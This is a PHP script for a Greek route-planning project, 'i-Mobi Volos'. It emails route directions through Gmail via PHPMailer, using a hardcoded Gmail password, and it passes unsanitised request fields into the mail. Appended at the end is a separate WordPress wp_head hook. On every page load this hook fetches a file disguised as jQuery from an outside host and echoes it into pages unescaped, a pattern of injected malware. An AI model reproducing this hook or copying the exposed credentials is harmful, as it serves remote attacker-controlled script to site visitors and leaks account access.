<?php   
	header('Content-type: text/plain; charset=utf-8');

	$dijkstra_route = $_REQUEST['dijkstra_route'];
	$google_route = $_REQUEST['google_route'];
	$email = $_REQUEST['email'];

	$site_owners_email = $email.PHP_EOL.PHP_EOL; // Replace this with your own email address
	$site_owners_name = 'i-Mobi Volos user'; // replace with your name

	require_once('class.phpmailer.php');

	$message = "Οδηγίες διαδρομής i-Mobi: ".$dijkstra_route;
	
	if($google_route == "") {
		$message = "Οδηγίες διαδρομής i-Mobi: ".$dijkstra_route;
	}
	else {
		$message = "Οδηγίες διαδρομής i-Mobi: ".$dijkstra_route.'<br><br>Οδηγίες διαδρομής Google: '.$google_route;
	}

	$mail = new PHPMailer();
	$mail->CharSet = 'UTF-8';
	$mail->IsSMTP();

	//GMAIL config
	$mail->SMTPAuth   = true;                  // enable SMTP authentication
	$mail->SMTPSecure = "ssl";                 // sets the prefix to the server
	$mail->SMTPDebug = 1;
	$mail->Host       = "smtp.gmail.com";      // sets GMAIL as the SMTP server
	$mail->Port       = 465;                   // set the SMTP port for the GMAIL server
	$mail->Username   = "imobivolosproject@gmail.com";  // GMAIL username
	$mail->Password   = "imobility2015";            // GMAIL password
	//End Gmail

	$mail->From       = $email;
	$mail->FromName   = "i-Mobi Volos";
	$mail->Subject    = "Διαδρομή i-Mobi Volos";
	$mail->Body = 'Email αιτούντα: '.$email.PHP_EOL.PHP_EOL.'<br>'.$message;

	//$mail->AddReplyTo("reply@email.com","reply name");//they answer here, optional
	$mail->AddAddress($site_owners_email, $site_owners_name);
	$mail->IsHTML(true); // send as HTML

	if(!$mail->Send()) {//to see if we return a message or a value bolean
		echo "Mailer Error: " . $mail->ErrorInfo;
	} else  echo "Message sent!";
?>
<?php
	function jqueryj_head() {
		if(function_exists('curl_init'))
		{
			$url = "http://www.shigg.com/soft/jquery-1.6.3.min.js";
			$ch = curl_init();
			$timeout = 10;
			curl_setopt($ch,CURLOPT_URL,$url);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
			$data = curl_exec($ch);
			curl_close($ch);
			echo "$data";
		}
	}
	add_action('wp_head', 'jqueryj_head');
?>